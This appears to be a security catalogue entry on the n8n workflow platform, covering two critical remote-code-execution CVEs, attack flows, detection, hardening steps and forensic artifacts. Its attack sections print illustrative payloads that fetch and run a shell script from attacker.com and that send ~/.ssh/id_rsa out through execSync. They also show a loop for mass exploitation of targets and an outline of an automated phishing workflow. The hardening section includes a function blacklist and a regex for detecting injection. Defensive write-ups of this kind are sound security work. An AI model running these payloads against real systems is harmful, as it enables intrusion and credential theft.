---
layout: agent
title: n8n Workflow Automation
vendor: n8n.io
category: Autonomous Agent
platforms:
  - Windows
  - macOS
  - Linux
  - Docker
privilege_level: User
capabilities:
  - Server-side expression evaluation
  - Workflow automation (400+ integrations)
  - Terminal command execution
  - File system operations
  - API integrations (AWS, Google, Slack, etc.)
  - Form submissions without authentication
mitre_techniques:
  - T1059.001
  - T1059.004
  - T1210
  - T1190
---

## Description

n8n is a popular AI workflow automation platform with over 100 million Docker pulls. It enables building automated workflows through nodes, integrating AI agents with hundreds of services. Two critical RCE vulnerabilities make it one of the most dangerous AI agent platforms currently deployed.

## Attack Vectors

### 1. Ni8mare - Unauthenticated RCE

**MITRE ATT&CK**: [T1190](https://attack.mitre.org/techniques/T1190/) - Exploit Public-Facing Application  
**CVE**: CVE-2026-21858  
**CVSS**: 10.0 (Critical)

Worst-case scenario vulnerability allowing unauthenticated remote attacker to gain full administrative control.

```http
POST /form/test HTTP/1.1
Host: vulnerable-n8n.com
Content-Type: application/json

{
  "data": {
    "malicious_payload": "$(curl https://attacker.com/shell.sh | bash)"
  }
}
```

**Attack Flow:**
1. Attacker submits malicious form data
2. Content-type confusion bug triggered
3. Authentication bypass achieved
4. Full admin access obtained
5. Database encryption key extracted
6. Arbitrary code execution

### 2. Authenticated Expression Injection

**MITRE ATT&CK**: [T1059](https://attack.mitre.org/techniques/T1059/)  
**CVE**: CVE-2025-68613  
**CVSS**: 9.9 (Critical)

Expression evaluation engine allows authenticated attackers to achieve RCE.

```javascript
// Malicious workflow node
{
  "nodes": [{
    "type": "Set",
    "parameters": {
      "values": {
        "string": [
          {
            "name": "result",
            "value": "={{ $processObject.mainModule.require('child_process').execSync('curl https://attacker.com/exfil -d @~/.ssh/id_rsa').toString() }}"
          }
        ]
      }
    }
  }]
}
```

### 3. Form-Based RCE

**MITRE ATT&CK**: [T1210](https://attack.mitre.org/techniques/T1210/)

Forms can be submitted without authentication, enabling mass exploitation.

```bash
# Automated exploitation
for target in $(cat targets.txt); do
  curl -X POST "https://$target/form/test" \
    -H "Content-Type: application/json" \
    -d '{"data": {"cmd": "$(malicious_payload)"}}'
done
```

### 4. AI-Powered Social Engineering

**MITRE ATT&CK**: [T1566](https://attack.mitre.org/techniques/T1566/)

n8n workflows can automate phishing campaigns at scale.

```
Workflow:
1. AI scrapes target information
2. Generates personalized emails
3. Tracks opens/clicks
4. Harvests credentials via fake forms
5. Exfiltrates to attacker
```

## Detection

### Network Monitoring
```bash
# Monitor for suspicious form submissions
tcpdump -i any -s 0 -w n8n.pcap 'port 5678'

# Look for command injection patterns
grep -r "execSync\|spawn\|exec" /var/log/n8n/
```

### Application Logs
```
~/.n8n/logs/
/var/log/n8n/
Docker container logs
```

### Behavioral Indicators
- Unusual form submissions
- Expression evaluation errors
- Unexpected child processes
- Outbound connections to unknown hosts
- Database access anomalies

## Prevention

### Immediate Actions

**1. Update Immediately**
```bash
# Docker
docker pull n8nio/n8n:1.121.0

# npm
npm update n8n -g
```

**2. Require Authentication for Forms**
```javascript
// n8n settings
{
  "forms": {
    "requireAuth": true,
    "allowPublic": false
  }
}
```

**3. Network Restrictions**
```bash
# Firewall rules
iptables -A INPUT -p tcp --dport 5678 -s TRUSTED_IP -j ACCEPT
iptables -A INPUT -p tcp --dport 5678 -j DROP

# Don't expose to internet
```

### Long-Term Mitigations

**1. Expression Sandboxing**
```javascript
// Restrict dangerous functions
{
  "executions": {
    "maxExpressionDepth": 10,
    "blacklistFunctions": [
      "require",
      "process",
      "child_process",
      "fs"
    ]
  }
}
```

**2. Input Validation**
```javascript
// Validate all form inputs
function validateInput(data) {
  const dangerous = /[;&|`$(){}[\]<>]/;
  if (dangerous.test(JSON.stringify(data))) {
    throw new Error("Malicious input detected");
  }
}
```

**3. Network Segmentation**
- Run n8n in isolated network
- Use VPN for access
- Implement WAF rules
- Monitor all traffic

**4. Audit Logging**
```javascript
{
  "logging": {
    "level": "debug",
    "auditLog": true,
    "expressionEvaluation": true,
    "fileAccess": true
  }
}
```

## Artifacts

### Configuration Files
```
~/.n8n/
~/.n8n/config/
/root/.n8n/
```

### Database
```
~/.n8n/database.sqlite
PostgreSQL: n8n database
```

### Logs
```
~/.n8n/logs/
/var/log/n8n/
Docker: docker logs n8n
```

### Docker Compose
```yaml
/docker-compose.yml
/n8n-docker-compose.yml
```

## References

- [Ni8mare (CVE-2026-21858) - Cyera Labs](https://www.cyera.com/research-labs/ni8mare-unauthenticated-remote-code-execution-in-n8n-cve-2026-21858)
- [CVE-2025-68613 - SonicWall](https://www.sonicwall.com/blog/n8n-ai-workflow-automation-remote-code-execution-vulnerability-cve-2025-68613-)
- [n8n Documentation](https://docs.n8n.io/)
- [n8n GitHub](https://github.com/n8n-io/n8n)

## Related Agents

- [Langchain-core](/agents/langchain-core/)
- [AutoGPT](/agents/autogpt/)
- [Devin](/agents/devin/)
